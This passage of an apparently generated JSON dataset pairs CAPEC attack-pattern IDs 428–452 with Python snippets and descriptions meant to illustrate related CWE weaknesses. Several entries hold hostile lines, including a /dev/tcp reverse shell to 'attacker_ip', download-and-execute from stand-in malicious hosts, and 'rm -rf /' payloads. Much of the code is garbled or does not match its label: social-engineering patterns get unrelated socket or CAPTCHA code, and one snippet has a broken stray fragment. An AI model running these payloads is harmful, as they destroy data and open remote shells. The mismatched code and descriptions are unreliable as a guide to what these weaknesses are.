    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\nimport json\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-1229: Creation of Emergent Resource\n# CWE-222: Truncation of Security-relevant Information\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef communicate_with_target(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target_ip, target_port))\n    \n    # CWE-300: No verification of the target's identity\n    # CWE-940: No verification of the origin of the request\n    request = {'action': 'get_data', 'params': {'user_id': 123}}\n    sock.send(json.dumps(request).encode())\n    \n    # CWE-1229: Creation of an emergent resource (new socket)\n    new_sock, addr = sock.accept()\n    \n    # CWE-222: Truncation of security-relevant information (e.g., logging only partial request data)\n    log_data = {'request': {'action': request['action']}}\n    print('Received request:', log_data)\n    \n    # CWE-301: Reflection attack in an authentication protocol (e.g., replaying a valid request)\n    response = {'data': 'some_data'}\n    new_sock.send(json.dumps(response).encode())\n    \n    # CWE-300: No encryption or integrity checking of the communication channel\n    sock.close()\n    new_sock.close()\n\n# Example usage\ncommunicate_with_target('192.168.1.100', 8080)",
        "description": "This code snippet demonstrates a vulnerable communication channel that can be exploited by an adversary to build rapport with a target and manipulate them into sharing information. The code lacks proper verification of the target's identity, origin of the request, and integrity of the communication channel, making it susceptible to various attacks."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import time\nimport random\n\ndef eye_movement_analysis(eye_movements):\n    # CWE-205: Observable Behavioral Discrepancy\n    if len(eye_movements) > 10:\n        # CWE-222: Truncation of Security-relevant Information\n        eye_movements = eye_movements[:10]\n    \n    # CWE-203: Observable Discrepancy\n    if eye_movements.count('left') > eye_movements.count('right'):\n        return 'left'\n    elif eye_movements.count('left') < eye_movements.count('right'):\n        return 'right'\n    else:\n        return 'center'\n\n    # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n    ui_response = {'direction': eye_movement_analysis(eye_movements), 'confidence': random.uniform(0.5, 1.0)}\n    return ui_response\n\n# CWE-804: Guessable CAPTCHA\ndef generate_captcha():\n    return str(random.randint(1000, 9999))\n\ndef verify_captcha(user_input, captcha):\n    if user_input == captcha:\n        return True\n    else:\n        return False\n\n# Example usage\neye_movements = ['left', 'right', 'left', 'left', 'right', 'right', 'left', 'right', 'left', 'right', 'left']\nui_response = eye_movement_analysis(eye_movements)\nprint('Direction:', ui_response['direction'])\nprint('Confidence:', ui_response['confidence'])\n\ncaptcha = generate_captcha()\nprint('CAPTCHA:', captcha)\nuser_input = input('Enter the CAPTCHA: ')\nif verify_captcha(user_input, captcha):\n    print('CAPTCHA is valid')\nelse:\n    print('CAPTCHA is invalid')",
        "description": "This Python code snippet demonstrates the CAPEC of gaining information via non-verbal means from the target through eye movements. It includes CWE-205 by analyzing the length of the eye movements, CWE-222 by truncating the eye movements, CWE-203 by observing the discrepancy in eye movements, CWE-451 by misrepresenting the confidence level of the analysis, and CWE-804 by generating a guessable CAPTCHA."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\n\n# CWE-1125: Excessive Attack Surface\n\n# Define a large number of unnecessary functions\nfor i in range(1000):\n    globals()[f'func_{i}'] = lambda x: x**2\n\n# CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n\n# Simulate speculative execution\ndef speculative_execution(x):\n    try:\n        # Perform some operation that may raise an exception\n        result = 1 / x\n    except ZeroDivisionError:\n        # Handle the exception, but potentially expose sensitive information\n        logging.debug('Exception caught!')\n    return result\n\n# CWE-534, CWE-533: Information Exposure Through Log Files\n\n# Log sensitive information\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\nlogging.debug('Sensitive data: %s', 'some_secret_data')\n\n# CWE-1420: Exposure of Sensitive Information during Transient Execution\n\n# Simulate transient execution\ndef transient_execution(x):\n    try:\n        # Perform some operation that may expose sensitive information\n        result = x * 2\n    except Exception as e:\n        # Handle the exception, but potentially expose sensitive information\n        logging.debug('Exception caught! %s', str(e))\n    return result",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves an excessive attack surface, information exposure through microarchitectural state after transient execution, information exposure through log files, and exposure of sensitive information during transient execution. The code defines a large number of unnecessary functions, simulates speculative execution, logs sensitive information, and simulates transient execution, potentially exposing sensitive data."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, request, render_template\napp = Flask(__name__)\n\n@app.route('/user', methods=['GET'])\ndef get_user():\n    user_id = request.args.get('user_id')\n    try:\n        user_data = get_user_data_from_db(user_id)\n        return render_template('user.html', user=user_data)\n    except Exception as e:\n        return 'Error: ' + str(e), 500\n\n@app.route('/template', methods=['GET'])\ndef get_template():\n    template_data = request.args.get('template_data')\n    return render_template_string(template_data)\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This code snippet demonstrates a vulnerable Flask application that embodies the main idea of the deprecated CAPEC. It has multiple issues: 1) it does not validate the 'user_id' input, making it vulnerable to Improper Validation of Syntactic Correctness of Input (CWE-1286). 2) It does not neutralize special characters in the error message, making it vulnerable to Improper Neutralization of Script in an Error Message Web Page (CWE-81). 3) The application has an excessive attack surface due to the use of render_template_string, which can lead to code injection (CWE-1125). 4) The template engine is not properly neutralizing special elements, making it vulnerable to Improper Neutralization of Special Elements Used in a Template Engine (CWE-1336). 5) The error message contains sensitive information about the environment, making it vulnerable to Generation of Error Message Containing Sensitive Information (CWE-209)."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import json\n\ndef parse_json(data):\n    try:\n        return json.loads(data)\n    except json.JSONDecodeError:\n        return {}\n\nuser_input = '{\"name\":\"user\"}'\n\n# CWE-149: Improper Neutralization of Quoting Syntax\nuser_input_malicious = '{\"name\":\"user\";system(\"rm -rf /\")}'\n\n# CWE-1286: Improper Validation of Syntactic Correctness of Input\ntry:\n    parsed_data = parse_json(user_input_malicious)\n    print(parsed_data)\nexcept Exception as e:\n    # CWE-534, CWE-533: Information Exposure Through Log Files\n    print(f'Error: {e}')",
        "description": "This code snippet demonstrates a vulnerability to CAPEC-XXX (deprecated) by showcasing improper neutralization of quoting syntax (CWE-149) and improper validation of syntactic correctness of input (CWE-1286). The code attempts to parse a malicious JSON input that injects a system command, which can lead to unexpected actions. The error handling mechanism also exposes information through debug log files (CWE-534, CWE-533)."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\nimport json\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef send_message(host, port, message):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    sock.sendall(message.encode())\n    sock.close()\n\n# CWE-806: Buffer Access Using Size of Source Buffer\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n# CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n\ndef receive_message(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((host, port))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    message = conn.recv(1024)  # fixed-size buffer, potential for buffer overflow\n    conn.close()\n    return message.decode()\n\n# Example usage:\nhost = 'localhost'\nport = 8080\n\nmessage = 'This is a secret message. ' * 100  # CWE-319: Cleartext Transmission of Sensitive Information\nsend_message(host, port, message)\n\nreceived_message = receive_message(host, port)\nprint(received_message)\n",
        "description": "This code snippet demonstrates a vulnerable communication channel that can be exploited using the human buffer overflow methodology. The `send_message` function sends a message over a socket without ensuring its integrity, and the `receive_message` function receives the message without checking its size, leading to potential buffer overflows. The example usage shows how to send a sensitive message in cleartext, which can be sniffed by unauthorized actors."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\ndef generate_captcha():\n    captcha = ''.join(random.choice('0123456789ABCDEF') for _ in range(6))\n    return captcha\n\ndef check_captcha(user_input, captcha):\n    if user_input == captcha:\n        return True\n    else:\n        return False\n\ndef get_sensitive_data(user_id):\n    # Assume this function retrieves sensitive data from a database\n    data = {'user_id': user_id, 'credit_card_number': '1234-5678-9012-3456', 'expiration_date': '2025-12-31'}\n    return data\n\ndef authenticate_user(user_id, captcha_input):\n    captcha = generate_captcha()\n    if check_captcha(captcha_input, captcha):\n        data = get_sensitive_data(user_id)\n        return {'authenticated': True, 'data': data}\n    else:\n        return {'authenticated': False, 'error': 'Invalid captcha'}\n\n# Example usage\nuser_id = 12345\ncaptcha_input = '123456'\nresult = authenticate_user(user_id, captcha_input)\nprint(result)",
        "description": "This code snippet demonstrates the CAPEC of Exposure of Sensitive Information Through Data Queries. The `authenticate_user` function generates a CAPTCHA, but the CAPTCHA can be easily guessed (CWE-804). If the user inputs the correct CAPTCHA, the function retrieves sensitive data (credit card number and expiration date) from a database, which may be incompatible with the security policies of other stakeholders (CWE-213). The function's behavior may also reveal internal state or decision process, allowing an attacker to infer information (CWE-205). Additionally, the code relies on a single source of data, making it vulnerable to compromised data sources (CWE-1293)."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-940: Improper Verification of Source of a Communication Channel\n\nhost = 'example.com'\nport = 8080\n\n# Establish a communication channel without verifying the source\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((host, port))\n\n# CWE-673: External Influence of Sphere Definition\n# Allow external actors to define control spheres\ncontrol_sphere = input('Enter control sphere definition: ')\n\n# CWE-205: Observable Behavioral Discrepancy\n# Reveal internal state or decision process through observable behaviors\nif control_sphere == 'admin':\n    print('Access granted. You are an admin.')</sock.send(b'Hello, server!')\n\n# Receive response from server without verifying its origin\nresponse = sock.recv(1024)\nprint(response.decode())",
        "description": "This Python code snippet demonstrates the CAPEC-300 'Channel Accessible by Non-Endpoint' by establishing a communication channel without verifying the source or destination of the channel. It also includes CWE-941 'Incorrectly Specified Destination in a Communication Channel' by not correctly specifying the intended destination, CWE-940 'Improper Verification of Source of a Communication Channel' by not verifying the request origin, CWE-673 'External Influence of Sphere Definition' by allowing external actors to define control spheres, and CWE-205 'Observable Behavioral Discrepancy' by revealing internal state or decision process through observable behaviors."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "import os\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'malicious_firmware'\nif os.path.exists(untrusted_component):\n    print('Using untrusted component...')\n    # Load the malicious firmware\n    exec(open(untrusted_component).read())\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_key'\nwith open('unprotected_device_file', 'w') as f:\n    f.write(confidential_info)\n\n# CWE-1269: Product Released in Non-Release Configuration\nif os.environ.get('RELEASE_MODE') != 'TRUE':\n    print('Running in pre-production configuration...')\n    # Load default configuration\n    config = {'debug_mode': True, 'security_disabled': True}\nelse:\n    print('Running in release configuration...')\n    # Load release configuration\n    config = {'debug_mode': False, 'security_disabled': False}\n\n# CWE-1059: Insufficient Technical Documentation\n# No documentation provided for the following function\ndef undocumented_function():\n    pass\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'legacy_library'\ntry:\n    import non_updateable_component\nexcept ImportError:\n    print('Failed to import non-updateable component...')",
        "description": "This code snippet demonstrates the CAPEC of modifying a technology during its manufacture to carry out an attack. It includes multiple CWEs, such as using an untrusted component, leaving confidential information unprotected, releasing a product in a non-release configuration, lacking technical documentation, and relying on a non-updateable component. These vulnerabilities can be exploited by an attacker to gain unauthorized access or control over the system."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import os\n\n# CWE-1269: Product Released in Non-Release Configuration\nif os.environ.get('DEBUG') == 'True':\n    # Load pre-production configuration\n    config = {'db_username': 'dev_user', 'db_password': 'dev_password'}\nelse:\n    # Load production configuration\n    config = {'db_username': 'prod_user', 'db_password': 'prod_password'}\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nprint('Database Configuration:', config)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nfrom vulnerable_library import vulnerable_function\nvulnerable_function()\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nfrom untrusted_module import untrusted_function\nuntrusted_function()\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ndef custom_function():\n    # Introduce observable behavioral discrepancy\n    if os.environ.get('CUSTOM_BEHAVIOR') == 'True':\n        return 'Custom behavior'\n    else:\n        return 'Default behavior'\nprint('Product Behavior:', custom_function())",
        "description": "This Python code snippet demonstrates the CAPEC of undermining the integrity of a product during distribution. It includes multiple CWEs: CWE-1269 (product released in non-release configuration), CWE-200 (exposure of sensitive information), CWE-1395 (dependency on vulnerable third-party component), CWE-1357 (reliance on insufficiently trustworthy component), and CWE-207 (observable behavioral discrepancy with equivalent products). The code loads different configurations based on environment variables, exposes sensitive database credentials, uses a vulnerable library, relies on an untrusted module, and introduces observable behavioral discrepancies."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import os\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\n\n# Simulating a redundant block with a defect\nredundant_block = ['block1', 'block2']\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# Simulating an unpatchable component\nunpatchable_component = 'componentX'\n\n# CWE-1328: Security Version Number Mutable to Older Versions\n# Simulating a mutable security version number\nsecurity_version = 'v1.0'\n\n# Simulating an unauthorized agent injecting errors\ndef inject_error(block):\n    if block in redundant_block:\n        print(f'Error injected into {block}. Redundancy degraded.')\r\n    else:\n        print(f'Error injected into {unpatchable_component}.')\r\n\n\n# Simulating a voltage glitch\ndef voltage_glitch():\n    print('Voltage glitch detected. System operating in degraded mode.')\r\n\n\n# Simulating a clock glitch\ndef clock_glitch():\n    print('Clock glitch detected. System operating in degraded mode.')\r\n\n\n# Simulating a semiconductor defect\ndef semiconductor_defect():\n    print('Semiconductor defect detected. System operating in degraded mode.')\r\n\n\n# Simulating a downgrade to a vulnerable version\ndef downgrade_security_version():\n    global security_version\n    security_version = 'v0.9'\n    print(f'Security version downgraded to {security_version}.')\r\n\n\n# Simulating an attack\ninject_error('block1')\nvoltage_glitch()\nclock_glitch()\nsemiconductor_defect()\ndowngrade_security_version()",
        "description": "This code snippet demonstrates a system that is vulnerable to various hardware-based attacks. An unauthorized agent can inject errors into a redundant block, causing the system to operate in a degraded mode. The system also contains unpatchable components, making it vulnerable to attacks. Additionally, the system is susceptible to voltage and clock glitches, as well as semiconductor defects. Furthermore, the security version number can be downgraded to a vulnerable version, allowing an attacker to exploit known vulnerabilities."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"attacker_ip\", 8080)); os.system(\"/bin/bash -i >& /dev/tcp/attacker_ip/8080 0>&1\")'\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code(file_path):\n    with open(file_path, 'r+') as file:\n        file.write(malicious_code)\n\n# CWE-1277: Firmware Not Updateable\n# CWE-1229: Creation of Emergent Resource\nfirmware_path = '/firmware.bin'\nreplicate_malicious_code(firmware_path)\n\n# Spread malware through Bluetooth or 802.11\nimport bluetooth\nimport wifi\n\n# Establish Bluetooth connection\nserver_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\nserver_sock.bind(\"\")\nserver_sock.listen(1)\n\nport = bluetooth.PORT_ANY\nuuid = '94f39d29-7d6d-437d-973b-fba39e49d4ee'\nbluetooth.advertise_service(server_sock, \"Malicious Service\", service_id = uuid, service_classes = [uuid, bluetooth.SERIAL_PORT_CLASS], profiles = [bluetooth.SERIAL_PORT_PROFILE],)\n\n# Establish 802.11 connection\nwifi.connect('Malicious Network', 'password')\n\n# Spread malware through the established connections\nclient_sock, client_info = server_sock.accept()\nclient_sock.send(malicious_code.encode())\n",
        "description": "This Python code snippet demonstrates the CAPEC pattern of installing malicious logic into a seemingly benign component of a fielded system. It includes CWE-284: Improper Access Control by allowing unauthorized access to system resources, CWE-506: Embedded Malicious Code by injecting malicious code into the firmware, CWE-509: Replicating Malicious Code by spreading the malware through Bluetooth or 802.11 connections, CWE-1277: Firmware Not Updateable by not providing a mechanism to update the firmware, and CWE-1229: Creation of Emergent Resource by creating a new resource that can be used by attackers."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_code.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('malicious_code.py', 'wb') as f:\n        f.write(response.content)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-508: Non-Replicating Malicious Code\nos.system('python malicious_code.py')\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    # logic to replicate and spread the malicious code\n    pass",
        "description": "This Python code snippet demonstrates the CAPEC pattern of adding malicious logic to benign software. It downloads malicious code from a remote location without verifying its integrity, then executes it. The malicious code can be a non-replicating type that only affects the target system or a replicating type that spreads to other systems."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import subprocess; subprocess.call([\"/bin/rm\", \"-rf\", \"/\"])'  # delete entire filesystem\n\n# CWE-1229: Creation of Emergent Resource\nresource_path = '/tmp/malicious_resource'\nos.makedirs(resource_path, exist_ok=True)\n\n# CWE-277: Insecure Inherited Permissions\nos.chmod(resource_path, 0o777)  # set permissions to allow anyone to access\n\n# CWE-494: Download of Code Without Integrity Check\nimport urllib.request\nurl = 'https://example.com/malicious_code.py'\nurllib.request.urlretrieve(url, '/tmp/malicious_code.py')\n\n# CWE-671: Lack of Administrator Control over Security\nimport sys\nsys.argv = ['--no-security-checks']  # disable security checks\n\n# inject malicious code\nwith open(resource_path + '/malicious_file.py', 'w') as f:\n    f.write(malicious_code)\n\n# execute downloaded code\nimport subprocess\nsubprocess.call(['python', '/tmp/malicious_code.py'])",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary injecting malicious logic into a codebase or product. It includes CWE-506 embedded malicious code, CWE-1229 creation of emergent resource, CWE-277 insecure inherited permissions, CWE-494 download of code without integrity check, and CWE-671 lack of administrator control over security. The code creates a malicious resource, sets insecure permissions, downloads and executes malicious code, and disables security checks."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.environ.get('SECRET_KEY')\nprint(sensitive_info)\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\ndef insecure_function():\n    dynamic_code = input('Enter some code: ')\n    exec(dynamic_code)\n\ninsecure_function()\n\n# CWE-733 and CWE-1037: Compiler/Processor Optimization Removal or Modification of Security-critical Code\n# (Note: This example is not directly applicable in Python, as it's an interpreted language.\n# However, it's included to illustrate the concept)\ndef secure_function():\n    if os.access('/path/to/sensitive/file', os.R_OK):\n        print('Access granted')\n    else:\n        print('Access denied')\n\nsecure_function()",
        "description": "This code snippet demonstrates a development alteration attack, where an adversary modifies the code during development to achieve a negative impact when the system is deployed. It includes embedded malicious code, exposure of sensitive system information, improper control of dynamically-managed code resources, and potential compiler/processor optimization removal or modification of security-critical code."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os; os.system('rm -rf /')\"  # Replace with actual malicious code\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\nexec(malicious_code)\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\ndef non_reentrant_function():\n    exec(malicious_code)\n    non_reentrant_function()\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nuntrusted_library = requests.get('http://untrusted-source.com/malicious_library.py').text\nexec(untrusted_library)\n\n# CWE-494: Download of Code Without Integrity Check\nuntrusted_code = requests.get('http://untrusted-source.com/malicious_code.py').text\nexec(untrusted_code)\n\n# CAPEC: Exploiting configuration management system\nos.system('git config --global core.hooksPath /path/to/malicious/hooks')\n",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting a configuration management system to insert malicious logic into a software product's build, update, or deployment environment. It includes CWEs such as embedded malicious code, improper control of dynamically-managed code resources, unintended reentrant invocation of non-reentrant code, inclusion of functionality from an untrusted control sphere, and download of code without integrity check."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import os\nimport requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-1103: Use of Platform-Dependent Third Party Components\nfrom untrusted_third_party import vulnerable_library\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import os\nos.system('rm -rf /')\"\"\"\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = requests.get('https://vulnerable-component.com/download').content\nwith open('vulnerable_component.py', 'wb') as f:\n    f.write(vulnerable_component)\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nos.system('python vulnerable_component.py')\n\n# Malicious code execution\nexec(malicious_code)\n",
        "description": "This Python code snippet demonstrates a supply chain attack by including insecure third-party components. It imports a vulnerable library from an untrusted source, downloads a vulnerable component from a malicious website, and executes malicious code. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "import os\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n\ndef insecure_function():\n    # Security-critical protection mechanism\n    if os.access('/etc/shadow', os.R_OK):\n        return 'Access granted'\n    else:\n        return 'Access denied'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-657: Violation of Secure Design Principles\n\nclass InsecureServer:\n    def __init__(self):\n        self.sensitive_info = 'Top Secret Information'\n\n    def get_sensitive_info(self):\n        return self.sensitive_info\n\n    def authenticate(self, client_input):\n        # CWE-602: Client-Side Enforcement of Server-Side Security\n        if client_input == 'password123':\n            return True\n        else:\n            return False\n\n# CWE-657: Violation of Secure Design Principles\n# Design alteration attack: modifying system design to degrade system performance\nclass InsecureSystem:\n    def __init__(self):\n        self.design_flaw = 'Performance degradation'\n\n    def perform_task(self):\n        # Simulating performance degradation\n        for i in range(1000000):\n            pass\n        return 'Task completed'",
        "description": "This code snippet demonstrates a design alteration attack, where an adversary modifies the system design to achieve a negative impact once the system is deployed. The code includes multiple CWEs, including processor optimization removal of security-critical code, exposure of sensitive system information, client-side enforcement of server-side security, and violation of secure design principles. The InsecureServer class exposes sensitive information and uses client-side authentication, while the InsecureSystem class simulates performance degradation due to a design flaw."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\" * 100 + b\"\\x05\\x00\\x00\\x00\"  # embedded virus\n\n# CWE-426: Untrusted Search Path\nos.environ['PATH'] = \"/tmp/\" + os.environ['PATH']\n\n# CWE-1102: Reliance on Machine-Dependent Data Representation\nmachine_dependent_data = sys.platform + \"-\" + os.uname()[4]\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_virus():\n    try:\n        # inject malicious code into a DLL\n        dll_path = \"/tmp/malicious_dll.dll\"\n        with open(dll_path, \"rb+\") as f:\n            f.seek(100)\n            f.write(malicious_code)\n        # load the infected DLL\n        ctypes.CDLL(dll_path)\n    except Exception as e:\n        print(\"Error replicating virus: \" + str(e))\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.uname()\nprint(\"Sensitive system information: \" + str(sensitive_info))\n\nreplicate_virus()",
        "description": "This Python code snippet demonstrates the CAPEC of tampering with a DLL by embedding a virus into gaps between legitimate machine instructions. The virus is then loaded into memory, potentially infecting other systems. The code also exhibits CWE-506 by embedding malicious code, CWE-426 by using an untrusted search path, CWE-1102 by relying on machine-dependent data representation, CWE-509 by replicating malicious code, and CWE-497 by exposing sensitive system information."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\n\n# CWE-507: Trojan Horse\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-506: Embedded Malicious Code\ndef malicious_function():\n    os.system('echo \"Malicious code executed\" > /tmp/malicious_output')\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    os.scandir('AUX:/')\nexcept FileNotFoundError:\n    pass\n\n# CWE-67: Improper Handling of Windows Device Names\ndef process_pathname(pathname):\n    try:\n        with open(pathname, 'r') as f:\n            print(f.read())\n    except Exception as e:\n        print(f'Error processing pathname: {e}')\n\nprocess_pathname('CON:/example.txt')\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = '1.0'\nprint(f'Firmware version: {firmware_version}')\nprint('Firmware update not available.')",
        "description": "This Python code snippet demonstrates a deprecated CAPEC pattern that has been replaced by CAPEC-448: Malware Infection into Product Software. It includes various CWEs, such as Trojan Horse, Embedded Malicious Code, Call to Non-ubiquitous API, Improper Handling of Windows Device Names, and Firmware Not Updateable. The code intentionally includes malicious functionality, API calls that may not exist on all platforms, and improper handling of Windows device names, which can lead to security vulnerabilities and other consequences."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\n# CWE-507: Trojan Horse\n# CWE-506: Embedded Malicious Code\nmalicious_dll_path = 'C:\\malicious_dll.dll'\n\n# CWE-426: Untrusted Search Path\nsys.path.insert(0, malicious_dll_path)\n\n# CWE-67: Improper Handling of Windows Device Names\ndevice_name = 'CON'\nmalicious_file_path = f'C:\\{device_name}\\malicious_file.txt'\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    malicious_code = 'malicious_code_here'\n    with open(malicious_file_path, 'w') as f:\n        f.write(malicious_code)\n\n# Load the malicious DLL\nctypes.CDLL(malicious_dll_path)\n\n# Replicate the malicious code\nreplicate_malicious_code()",
        "description": "This Python code snippet demonstrates a deprecated attack pattern that embeds a virus into a DLL. It includes multiple CWEs, such as Trojan Horse, Embedded Malicious Code, Untrusted Search Path, Improper Handling of Windows Device Names, and Replicating Malicious Code. The code loads a malicious DLL, writes malicious code to a file, and replicates the malicious code."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import socket\nimport os\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\n# CWE-589: Call to Non-ubiquitous API\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = '1.0'\n\n# CWE-507: Trojan Horse\nmalicious_code = 'rm -rf /'\n\n# Perform DNS lookup\ndns_response = socket.gethostbyname('example.com')\n\n# Use non-ubiquitous API\nos.system('non_existent_api_call')\n\n# Bypass authentication\nif dns_response == '127.0.0.1':\n    # Execute malicious code\n    os.system(malicious_code)\n\n# Firmware update check\nif firmware_version != 'latest':\n    print('Firmware is outdated')\nelse:\n    print('Firmware is up to date')",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern that has been replaced by CAPEC-448: Malware Infection into Product Software. It includes various CWEs, such as reliance on DNS lookups in a security decision, calling non-ubiquitous APIs, authentication bypass issues, firmware not being updateable, and Trojan Horse code. The code performs a DNS lookup, uses a non-existent API call, bypasses authentication, and executes malicious code. It also checks for firmware updates but does not provide a way to update the firmware."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
